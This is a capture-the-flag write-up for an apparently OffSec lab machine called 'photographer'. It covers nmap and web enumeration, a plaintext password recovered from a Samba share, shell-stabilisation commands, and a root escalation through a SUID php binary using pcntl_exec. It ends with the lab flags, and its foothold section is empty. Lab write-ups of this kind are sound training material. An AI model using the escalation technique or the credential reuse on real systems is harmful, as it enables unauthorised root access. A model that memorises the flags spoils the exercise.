# [About]

```
=========================================================================
[OS]:   Ubuntu
[Web-Technology]:   Apache httpd 2.4.18
[Hostname]:   photographer
[IP]:     192.168.247.76
[USERS]: daisa@photographer.com, daisa, agi, agi@photographer.com
[CREDENTIALS]: babygirl
=========================================================================
```
-----------------------------------------------------------------------------

# [Enumeration]

--	[Network Enumeration]

```
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 41:4d:aa:18:86:94:8e:88:a7:4c:6b:42:60:76:f1:4f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCq9GoYsvJTOUcsgHSES9+20Ix4Q8wjm5slMheJ2ME+COokAqxBzXSr458KBmHv3bsTLWAH9FxoXJ6zrzDPmPApcqVifB4aI9l/VYxoeJCj54kKIQlCKkWTZjsAeLBI2Lk2+yJLLFWPTAZ2htwRAwCl9z8YV3xgtqhTa+5BqIm/GInW4PYV0zi9zOMn2g4jNSWvy91FBUboGLwVgNYslGBydNW8Fhz8X/LXHZ1x6ulA76W026VEGOiQfoiIi84IFi9CbP8GIKfQ7BHuDlMqgiN9+w7K0z0oFdtiFhAS/48w89MYn6UOzw7Aaa9eLQi0+zxpW5SpCpw0mC2euzPxow2Z
|   256 4d:a3:d0:7a:8f:64:ef:82:45:2d:01:13:18:b7:e0:13 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMz4UG2gfu7L/Lxcqek1pZf46d8SocbES1A2a/XUYQgTmIqJuCEpLf3ERgVXS+7Lwdi6+F3xkI/lYFCA5MkRUQA=
|   256 1a:01:7a:4f:cf:95:85:bf:31:a1:4f:15:87:ab:94:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDL5ZwzA5dpqtWx4ZzjVQ6NMzVUia8/We8txfiAn+mv4
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Photographer by v1n1v131r4
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: daisa ahomi
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: Koken 0.22.24
Service Info: Host: PHOTOGRAPHER; OS: Linux; CPE: cpe:/o:linux:linux_kernel


```
-----------------------------------------------------------------------------

--	[Web Enumeration]

```
--> Files & Directories
200      GET        3l      453w    22017c http://photographer.local:8000/settings.css.lens
301      GET        9l       28w      333c http://photographer.local:8000/storage => http://photographer.local:8000/storage/
301      GET        9l       28w      331c http://photographer.local:8000/admin => http://photographer.local:8000/admin/
200      GET        1l       33w     1334c http://photographer.local:8000/storage/themes/elementary/css/kshare.css
200      GET        1l        1w      825c http://photographer.local:8000/app/site/themes/common/css/reset.css
200      GET       10l       33w      712c http://photographer.local:8000/feed/essays/recent.rss
200      GET       10l       33w      716c http://photographer.local:8000/feed/content/recent.rss
301      GET        9l       28w      329c http://photographer.local:8000/app => http://photographer.local:8000/app/
200      GET        5l     1434w    97163c http://photographer.local:8000/app/site/themes/common/js/jquery.min.js
200      GET        1l       10w     1267c http://photographer.local:8000/app/site/themes/common/js/share.js
200      GET        1l        6w     1863c http://photographer.local:8000/app/site/themes/common/css/kicons.css
200      GET        1l       55w     2285c http://photographer.local:8000/app/site/themes/common/js/html5shiv.js
200      GET       94l      291w     4603c http://photographer.local:8000/
500      GET       18l       95w      743c http://photographer.local:8000/error%1F_log



```
-----------------------------------------------------------------------------
# [Foothold]


```bash

```

@hackthebox 



-----------------------------------------------------------------------------
# [Pivoting]


```bash
export TERM=xternm
python -c 'import pty;pty.spawn("/bin/bash")' 
ls -la
cd /home 
ls -la
cd /daisa
ls -la
cat local.txt
```

-----------------------------------------------------------------------------

# [Privilege-Escalation]

--> We tried switching from `www-data` user to daisa with the same credentials we found on the `mailsent.txt` samba share. [babygirl]. But unfortunately we are not able to leverage that. Tried with `agi` user also.

```bash
find / -perm -u=s -type f 2>/dev/null 

CMD="/bin/sh"
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```


-----------------------------------------------------------------------------
# [Take away Concept]
```
=========================================================================
* 
* 

=========================================================================
```

-----------------------------------------------------------------------------
# [Flags]

`local.txt :  732beebe3b4faa48ed37eb881bdfa170`
`proof.txt : 5e321a598d1d391380853230e8a9efc4`



#offsec #easy